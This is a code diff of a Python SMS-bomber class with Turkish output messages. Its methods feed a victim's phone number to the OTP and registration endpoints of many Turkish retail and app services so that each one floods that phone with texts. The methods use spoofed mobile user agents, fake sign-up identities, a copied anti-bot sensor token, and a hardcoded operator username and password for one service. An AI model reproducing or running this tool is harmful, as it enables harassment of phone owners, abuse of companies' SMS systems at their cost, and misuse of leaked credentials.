@@ -6,21 +6,6 @@ from colorama import Fore, Style
 false = False
 true = True
 
-class SendSms():
-    adet = 0
-    
-    def __init__(self, phone, mail):
-        self.phone = str(phone)
-        if len(mail) != 0:
-            self.mail = mail
-        else:
-            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
-
-import requests
-from random import choice
-from string import ascii_lowercase
-from colorama import Fore, Style
-
 
 class SendSms():
     adet = 0
@@ -35,29 +20,15 @@ class SendSms():
 
 
 
-
-    #service.petopy.com by ever0ne
-    def Petopy(self):
-        try:
-            site = requests.post("https://service.petopy.com/api/auth/send-sms", 
-                                   headers={"User-Agent":"okhttp/5.0.0-alpha.10","locale":"tr"},  
-                                   json={"country_code": "+90","phone": self.phone,"opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
-            if site.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Petopy by ever0ne")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Petopy by ever0ne")
 
 
     #apigw.chippin.com by ever0ne
     def Chippin(self):
         try:
-            underarmour = requests.post("https://apigw.chippin.com/gsmVerification/generateGsmVerificationCode", 
+            Chippin = requests.post("https://apigw.chippin.com/gsmVerification/generateGsmVerificationCode", 
                                    headers={"DeviceId":"76e95ca596a1eb1b","User-Agent":"okhttp/4.10.0"},  
                                    json={"gsm": self.phone})
-            if underarmour.status_code == 200:
+            if Chippin.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Chippin by ever0ne")
                 self.adet += 1
             else:
@@ -94,22 +65,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> UnderArmour by ever0ne")
 
             
-    #vakko.com by ever0ne
-    def Vakko(self):
-        try:
-            vakkoget = requests.get("https://www.vakko.com/csrf_token/?format=json")
-            csrftoken = (vakkoget.cookies.get_dict()["csrftoken"])
-            vakko = requests.post("https://www.vakko.com/vakko_app/users/registration/?format=json", 
-                            
-                                   headers={"Cookie":f"sessionid={vakkoget.cookies.get_dict()['sessionid']};csrftoken={csrftoken}","x-csrftoken": vakkoget.json()["csrf_token"],"X-App-Device":"android","User-Agent":"okhttp/4.10.0","Content-Type":"application/json"},  
-                                   json={"call_allowed": false,"confirm": true,"confirm_kvkk": true,"csrfmiddlewaretoken": vakkoget.json()["csrf_token"],"date_of_birth": "1999-01-01","email": self.mail,"email_allowed": false,"first_name": "AHMET","last_name": "BİLEN","password": "asdasd123A","phone": f"0{self.phone}","sms_allowed": false})
-            if vakko.json()['success'] == 'SMS gönderildi.':
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Vakko by ever0ne")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Vakko by ever0ne")
 
 
     #frontend.dominos.com.tr by ever0ne
@@ -143,42 +98,41 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Boyner by ever0ne")
 
             
-    #mobileapp.lcwaikiki.com by ever0ne
-    def LcWaikiki(self):
+
+    #service.petopy.com by ever0ne
+    def Petopy(self):
         try:
-            waikiki = requests.post("https://mobileapp.lcwaikiki.com/mobile/apigateway/api/v1/preRegister.json", 
-                                   headers={"User-Agent":"lcwaikikimobileapp/3.3.87 (samsung SM-N975F; Android 9 (28))","X-acf-sensor-data":"2,a,YSmsPNCY2WblfqHXMgEoHoyVnIev8f1Qeovn15secBeDuj68J0gflMWkpuDUKPEKuKCFPw6Egz0O6MCz/55dn/eSuYrDLVZRDiNBAbu2elKTfMI87EBhs39jR2k7ULFRRoRGjsGzBctn1ye9KINHu+roUDJQ+XnNZQR+A5SRdSo=,AiYiP/J+38ZFhZQEXMu3bLus6FL6k96IH7Yjjt64901OvjUh5lTh9RblqhjbjoIEGjSvmP5vlZ+J713kFHhl0tdqwcn5QyJXUPMJw7/aOSMIR70MN9t72oSRo+v8UP3YWza639UckdOtCE3xPIhoQjGXq/+P2rhesdqW0IXkxtA=$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$1000,0,0$$"},  
-                                   json={"email": self.mail,"phoneNumber": self.phone})
-            if waikiki.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> LC Waikiki by ever0ne")
+            site = requests.post("https://service.petopy.com/api/auth/send-sms", 
+                                   headers={"User-Agent":"okhttp/5.0.0-alpha.10","locale":"tr"},  
+                                   json={"country_code": "+90","phone": self.phone,"opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
+            if site.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Petopy by ever0ne")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> LC Waikiki by ever0ne")
-        
-     
-    #wmf.com.tr
-    def Wmf(self):
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Petopy by ever0ne")
+
+    #vakko.com by ever0ne
+    def Vakko(self):
         try:
-            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
-                "confirm": "true",
-                "date_of_birth": "1956-03-01",
-                "email": self.mail,
-                "email_allowed": "true",
-                "first_name": "Memati",
-                "gender": "male",
-                "last_name": "Bas",
-                "password": "31ABC..abc31",
-                "phone": f"0{self.phone}"
-            })
-            if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
-                self.adet += 1   
+            vakkoget = requests.get("https://www.vakko.com/csrf_token/?format=json")
+            csrftoken = (vakkoget.cookies.get_dict()["csrftoken"])
+            vakko = requests.post("https://www.vakko.com/vakko_app/users/registration/?format=json", 
+                            
+                                   headers={"Cookie":f"sessionid={vakkoget.cookies.get_dict()['sessionid']};csrftoken={csrftoken}","x-csrftoken": vakkoget.json()["csrf_token"],"X-App-Device":"android","User-Agent":"okhttp/4.10.0","Content-Type":"application/json"},  
+                                   json={"call_allowed": false,"confirm": true,"confirm_kvkk": true,"csrfmiddlewaretoken": vakkoget.json()["csrf_token"],"date_of_birth": "1999-01-01","email": self.mail,"email_allowed": false,"first_name": "AHMET","last_name": "BİLEN","password": "asdasd123A","phone": f"0{self.phone}","sms_allowed": false})
+            if vakko.json()['success'] == 'SMS gönderildi.':
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Vakko by ever0ne")
+                self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Vakko by ever0ne")
+
+
+
+
     
     
     #bim
@@ -194,33 +148,10 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
 
 
-    #englishhome.com
-    def Englishhome(self):
-        try:
-            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
-            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
-            if home.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
+
     
 
-    #mopas.com.tr
-    def Mopas(self):
-        try:
-            cookies = {"JSESSIONID": "6817377124C666AA59F3E6B0678F124C"}
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=", cookies=cookies, headers=headers)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
+
                 
     
     #KimGbIster
@@ -236,19 +167,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
             
         
-    #marti.tech
-    def Marti(self):
-        try:
-            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
-            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
-            r = requests.post(url,  json=json)
-            if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
+
 
     #tiklagelsin.com
     def TiklaGelsin(self):
@@ -313,22 +232,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
 
 
-    #hizliecza.com.tr
-    def Hizliecza(self):
-        try:
-            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
-            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "Bearer null"}
-            json={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")
-
-
     #metro-tr.com
     def Metro(self):
         try:
@@ -377,20 +280,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")
 
 
-    #roombadi.com
-    def Roombadi(self):
-        try:
-            url = "https://api.roombadi.com:443/api/v2/auth/otp/authenticate"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "Roombadi/3 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en,tr"}
-            json={"countryId": 2, "phone": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["remainingTime"] == 120:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.roombadi.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")
+
     
     
     #porty.tech
@@ -488,19 +378,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
 
 
-    #vakiftasdelensu.com
-    def Tasdelen(self):
-        try:
-            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
-            json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
-            r = requests.post(url=url, json=json)
-            if r.json()["Result"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
 
 
     #file.com.tr
